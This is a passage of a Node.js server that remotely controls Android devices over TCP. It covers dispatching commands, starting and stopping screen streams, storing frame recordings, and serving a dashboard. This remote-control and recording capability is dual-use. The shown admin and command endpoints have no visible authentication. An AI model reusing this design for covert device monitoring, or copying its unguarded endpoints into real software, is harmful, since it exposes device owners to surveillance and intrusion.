        const deviceDir = path.join(RECORDINGS_DIR, deviceId.replace(/[^a-zA-Z0-9_-]/g, '_'));
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        const filename = `rec_${Date.now()}.json`;
        const filePath = path.join(deviceDir, filename);
        fs.writeFileSync(filePath, JSON.stringify({
            deviceId, startTime: rec.startTime, endTime: Date.now(),
            frameCount: rec.frames.length, frames: rec.frames
        }));
        broadcastDash('recording:saved', { deviceId, filename, frameCount: rec.frames.length });
        res.json({ success: true, deviceId, filename, frameCount: rec.frames.length });
    } catch (e) {
        broadcastDash('recording:error', { deviceId, message: e.message });
        res.status(500).json({ success: false, error: e.message });
    }
});

// ============================================
// REST ENDPOINTS
// ============================================
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find().sort({ lastSeen: -1 });
        res.json({ success: true, devices });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/devices/:deviceId', async (req, res) => {
    try {
        const device = await Device.findOne({ deviceId: req.params.deviceId });
        if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
        res.json({ success: true, device });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ── Flush pending command queue — called automatically at limit or on demand ──
function flushPendingQueue(deviceId) {
    const toFlush = deviceId
        ? [...pendingCmds.entries()].filter(([, p]) => p.deviceId === deviceId)
        : [...pendingCmds.entries()];

    for (const [cid, pending] of toFlush) {
        clearTimeout(pending.timer);
        if (pending.sseId) sseSend(pending.sseId, 'command:result', {
            commandId: cid, command: pending.command, deviceId: pending.deviceId,
            success: false, error: 'Queue reset — too many pending commands',
            timestamp: new Date()
        });
        pendingCmds.delete(cid);
    }

    if (toFlush.length) {
        log('CMD', `Queue flushed — cleared ${toFlush.length} pending commands${deviceId ? ' for ' + deviceId : ''}`, 'warn');
        broadcastDash('queue:reset', { deviceId: deviceId || null, cleared: toFlush.length, timestamp: new Date() });

        // Signal the device to reset its connection so it reconnects cleanly
        const targets = deviceId ? [deviceId] : [...new Set(toFlush.map(([, p]) => p.deviceId))];
        for (const did of targets) {
            const tcpId = deviceToTcp.get(did);
            const tc    = tcpId ? tcpClients.get(tcpId) : null;
            if (tc && tc.writable) {
                tcpSend(tc, 'connection:reset', { reason: 'queue_overflow', timestamp: Date.now() });
            }
        }
    }
}

const PENDING_CMD_LIMIT = 39;

app.post('/api/commands', async (req, res) => {
    const { deviceId, command, params, sseClientId } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });

    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });

    // ── Special: restart_connection — send connection:reset directly, no command queue ──
    if (command === 'restart_connection') {
        tcpSend(tcpConn, 'connection:reset', { reason: 'dashboard_request', timestamp: Date.now() });
        log('CMD', `restart_connection → ${deviceId} (connection:reset sent)`);
        return res.json({ success: true, command, deviceId, status: 'reset_sent', timestamp: new Date() });
    }

    // ── Queue overflow protection: flush at PENDING_CMD_LIMIT ──
    const devicePendingCount = [...pendingCmds.values()].filter(p => p.deviceId === deviceId).length;
    if (devicePendingCount >= PENDING_CMD_LIMIT) {
        flushPendingQueue(deviceId);
        return res.status(429).json({
            error: `Queue limit (${PENDING_CMD_LIMIT}) reached — queue has been reset. Retry your command.`,
            queueReset: true, deviceId
        });
    }

    const commandId = crypto.randomBytes(12).toString('hex');

    // Forward to device immediately — no queue, fire and forget over TCP
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });

    // Track streaming state so we can auto-resume after stream channel reconnects
    if (command === 'stream_start')  deviceStreamingState.add(deviceId);
    if (command === 'stream_stop')   deviceStreamingState.delete(deviceId);

    // Track pending so command:response can route the result back via SSE
    const timer = setTimeout(() => {
        if (pendingCmds.has(commandId)) {
            pendingCmds.delete(commandId);
            if (sseClientId) sseSend(sseClientId, 'command:result', {
                commandId, command, deviceId, success: false,
                error: 'Command timed out', timestamp: new Date()
            });
        }
    }, CMD_TIMEOUT_MS);
    pendingCmds.set(commandId, { sseId: sseClientId || null, command, deviceId, timer });

    // Respond immediately — command already sent to device via TCP
    res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
    log('CMD', `${command} → ${deviceId} [${commandId}]`);

    // Persist to DB fire-and-forget
    new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save().catch(() => {});
});

// ── Manual queue flush endpoint ───────────────────────────────────────────────
app.post('/api/commands/flush', (req, res) => {
    const { deviceId } = req.body || {};
    flushPendingQueue(deviceId || null);
    res.json({ success: true, message: 'Queue flushed', pendingBefore: pendingCmds.size });
});

// ── Task Studio — MongoDB-backed workflow storage (tasks are GLOBAL) ──────────
app.get('/api/tasks', async (req, res) => {
    try {
        const tasks = await Task.find({}).sort({ updatedAt: -1 });
        res.json({ success: true, tasks });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// Keep legacy route for backward compat — also returns all tasks
app.get('/api/tasks/:deviceId', async (req, res) => {
    try {
        const tasks = await Task.find({}).sort({ updatedAt: -1 });
        res.json({ success: true, tasks });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.post('/api/tasks', async (req, res) => {
    const { deviceId, name, steps, _id } = req.body || {};
    if (!name) return res.status(400).json({ success: false, error: 'name required' });
    try {
        let task;
        if (_id) {
            task = await Task.findByIdAndUpdate(_id, { name, steps: steps || [], updatedAt: new Date() }, { new: true });
            if (!task) return res.status(404).json({ success: false, error: 'Task not found' });
        } else {
            task = await new Task({ deviceId: deviceId || 'global', name, steps: steps || [] }).save();
        }
        res.json({ success: true, task });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.delete('/api/tasks/:taskId', async (req, res) => {
    try {
        await Task.findByIdAndDelete(req.params.taskId);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));

app.get('/api/health', async (req, res) => {
    const redisStats = await R.getStats();
    res.json({
        status: 'ok',
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
        redis: redisStats.connected
            ? `connected (${redisStats.onlineDevices} online / ${redisStats.totalDevices} total devices, mem: ${redisStats.memoryUsed})`
            : `disconnected${redisStats.error ? ' — ' + redisStats.error : ''}`,
        tcpClients: tcpClients.size,
        sseClients: sseClients.size,
        connectedDevices: deviceToTcp.size,
        pendingCommands: pendingCmds.size,
        tcpPort: TCP_PORT,
        httpPort: HTTP_PORT,
        uptime: process.uptime()
    });
});

app.get('/api/admin/users', async (req, res) => {
    try {
        const users = await User.find({}, '-password').sort({ createdAt: -1 });
        res.json({ success: true, users });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

// ── Recordings REST API ─────────────────────────────────────────────
app.get('/api/recordings/:deviceId', (req, res) => {
    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
    const deviceDir = path.join(RECORDINGS_DIR, safeId);
    if (!fs.existsSync(deviceDir)) return res.json({ recordings: [] });
    try {
        const files = fs.readdirSync(deviceDir).filter(f => f.endsWith('.json'));
        const recordings = files.map(f => {
            const fp = path.join(deviceDir, f);
            const stat = fs.statSync(fp);
            let extra = {};
            try {
                const raw = JSON.parse(fs.readFileSync(fp, 'utf8'));
                extra = { frameCount: raw.frameCount, startTime: raw.startTime, endTime: raw.endTime };
            } catch (_) {}
            return { filename: f, size: stat.size, modified: stat.mtime, ...extra };
        }).sort((a, b) => new Date(b.modified) - new Date(a.modified));
        res.json({ recordings });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.delete('/api/recordings/:deviceId/:filename', (req, res) => {
    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
    const safeName = path.basename(req.params.filename);
    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
    try { fs.unlinkSync(fp); res.json({ success: true }); }
    catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/recordings/:deviceId/:filename', (req, res) => {
    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
    const safeName = path.basename(req.params.filename);
    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
    res.download(fp);
});

app.get('/api/recordings/:deviceId/:filename/view', (req, res) => {
    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
    const safeName = path.basename(req.params.filename);
    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
    try {
        const data = JSON.parse(fs.readFileSync(fp, 'utf8'));
        res.json(data);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('*', (req, res) => {
    const fp = path.join(__dirname, 'public', req.path);
    if (fs.existsSync(fp) && fs.statSync(fp).isFile()) res.sendFile(fp);
    else {
        const index = path.join(__dirname, 'public', 'index.html');
        if (fs.existsSync(index)) res.sendFile(index);
        else res.status(404).send('Dashboard not built. Run: npm run build');
    }
});

// ============================================
// DB HELPERS
// ============================================
async function getDeviceList() {
    // Helper: override isOnline to match the live TCP socket map so the
    // dashboard never shows a device as online when commands would fail.
    const reconcile = (devices) => devices.map(d => {
        const obj = d.toObject ? d.toObject() : { ...d };
        obj.isOnline = deviceToTcp.has(obj.deviceId);
        return obj;
    });

    // Priority: MongoDB → Redis → in-memory
    try {
        const dbDevices = await Device.find().sort({ lastSeen: -1 });
        if (dbDevices && dbDevices.length > 0) return reconcile(dbDevices);
    } catch (_) {}
    // Fallback: Redis
    const redisDevices = await R.getAllDevices();
    if (redisDevices.length > 0) return reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen)));
    // Final fallback: in-memory
    return reconcile(Array.from(inMemoryDevices.values()));
}

async function broadcastDeviceList() {
    const list = await getDeviceList();
    broadcastDash('device:list', list);
}

// ============================================
// PERIODIC TASKS
// ============================================

// Ping TCP clients (Android devices)
setInterval(() => {
    for (const conn of tcpClients.values()) {
        if (conn.writable) tcpSend(conn, 'device:ping', { timestamp: Date.now() });
    }
}, PING_INTERVAL);

// Drop stale TCP connections — handle primary and secondary channels separately
setInterval(async () => {
    const now = Date.now();
    for (const [id, conn] of tcpClients) {
        if (!conn.deviceId) continue;
        if (now - conn.lastPong > PONG_TIMEOUT) {
            log('TCP', `Device ${conn.deviceId} timed out, dropping (channel: ${conn.channelType || 'primary'})`);
            tcpClients.delete(id);
            conn.destroy();

            if (conn.channelType === 'stream') {
                // Only remove stream ref if this IS the current active stream socket
                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
            } else if (conn.channelType === 'live') {
                // Only remove live ref if this IS the current active live socket
                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
            } else {
                // Primary channel — only mark offline if no newer primary has already taken over.
                // A new device:register replaces deviceToTcp with the new socket id, so if the
                // ids don't match this is a ghost/stale socket — discard it silently.
                if (deviceToTcp.get(conn.deviceId) !== id) {
                    log('TCP', `Stale primary socket for ${conn.deviceId} cleaned up silently (new primary active)`);
                    continue;
                }
                deviceToTcp.delete(conn.deviceId);
                try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
                broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
                broadcastDeviceList();
            }
        }
    }
}, 10000);

// Mark DB devices offline if not seen in 60s
setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - 60000);
        await Device.updateMany({ lastSeen: { $lt: cutoff }, isOnline: true }, { isOnline: false });
    } catch (e) {}
}, 30000);

// ============================================
// START
// ============================================

// Kill any stale process holding our ports before binding
const { execSync } = require('child_process');
try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
try { execSync(`fuser -k ${TCP_PORT}/tcp  2>/dev/null`); } catch (_) {}

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        log('HTTP', `Port ${HTTP_PORT} still in use — retrying in 2s…`);
        setTimeout(() => {
            try { execSync(`fuser -k ${HTTP_PORT}/tcp 2>/dev/null`); } catch (_) {}
            server.listen(HTTP_PORT);
        }, 2000);
    } else {
        throw err;
    }
});

// Initialize Redis first, then start HTTP server
R.init().then(() => {
    server.listen(HTTP_PORT, () => {
        log('HTTP', `Server running on port ${HTTP_PORT}`);
        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
        if (!process.env.REDIS_URL) {
            log('REDIS', 'REDIS_URL not configured — skipping Redis (in-memory only)', 'warn');
        }
    });
}).catch((err) => {
    log('REDIS', `Init error: ${err.message} — starting without Redis`, 'warn');
    server.listen(HTTP_PORT, () => {
        log('HTTP', `Server running on port ${HTTP_PORT}`);
        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
    });
});

async function gracefulShutdown(signal) {
    log('SHUTDOWN', `${signal} received — closing…`);
    try { await R.quit(); } catch (_) {}
    try { await mongoose.connection.close(); } catch (_) {}
    process.exit(0);
}

process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

module.exports = { app, server };
